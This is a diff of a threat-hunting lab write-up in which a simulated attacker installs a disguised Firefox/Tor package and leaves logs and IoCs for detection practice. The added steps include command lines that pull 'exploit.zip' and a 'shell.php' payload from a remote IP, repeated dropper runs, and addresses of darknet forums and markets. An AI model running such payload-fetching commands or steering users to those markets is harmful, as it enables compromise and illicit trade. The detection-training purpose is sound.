@@ -2,17 +2,22 @@
 **Detection of Unauthorized Firefox Installation and Malicious Activity on Workstation: snet**
 
 ## Steps the "Bad Actor" took Create Logs and IoCs:
-1. Downloaded a modified Firefox installer disguised as a legitimate file: ```Firefox Installer.exe```saved under ```C:\Users\employee0\Downloads\```
-2. Install it silently: ```tor-browser-windows-x86_64-portable-14.0.1.exe /S```
-3. Opens the TOR browser from the folder on the desktop
-4. Connect to TOR and browse a few sites. For example:
+1. Downloaded a modified Firefox installer disguised as a legitimate file: ```Firefox Installer.exe``` saved under ```C:\Users\employee0\Downloads\```.
+2. Executed the installer silently through ```setup-stub.exe``` with custom arguments: ```setup-stub.exe -no-remote -profile "C:\Users\employee0\Downloads\Temp\MalProfile" http://172.203.80.23/exploit.zip```
+3. Executed again using a different payload hosted on a remote web server: ```setup-stub.exe -no-remote -profile "C:\Users\employee0\Downloads\Temp\MalProfile" http://172.203.80.23/admin/shell.php```
+4. Multiple dropper executions occurred via ```download.exe``` in quick succession, indicating staged infection: ```"download.exe" /LaunchedFromStub /INI=C:\Users\EMPLOY~1\AppData\Local\Temp\nskC4FD.tmp\config.ini
+"download.exe" /LaunchedFromStub /INI=C:\Users\EMPLOY~1\AppData\Local\Temp\nso90D.tmp\config.ini
+"download.exe" /LaunchedFromStub /INI=C:\Users\EMPLOY~1\AppData\Local\Temp\nss9E77.tmp\config.ini```
+
+5. Opens the TOR browser from the folder on the desktop
+6. Connect to TOR and browse a few sites. For example:
    - **WARNING: The links to onion sites change a lot and these have changed. However if you connect to Tor and browse around normal sites a bit, the necessary logs should still be created:**
    - Current Dread Forum: ```dreadytofatroptsdj6io7l3xptbet6onoyno2yv7jicoxknyazubrad.onion```
    - Dark Markets Forum: ```dreadytofatroptsdj6io7l3xptbet6onoyno2yv7jicoxknyazubrad.onion/d/DarkNetMarkets```
    - Current Elysium Market: ```elysiumutkwscnmdohj23gkcyp3ebrf4iio3sngc5tvcgyfp4nqqmwad.top/login```
 
-6. Create a folder on your desktop called ```tor-shopping-list.txt``` and put a few fake (illicit) items in there
-7. Delete the file.
+7. Create a folder on your desktop called ```tor-shopping-list.txt``` and put a few fake (illicit) items in there
+8. Delete the file.
 
 ---
 
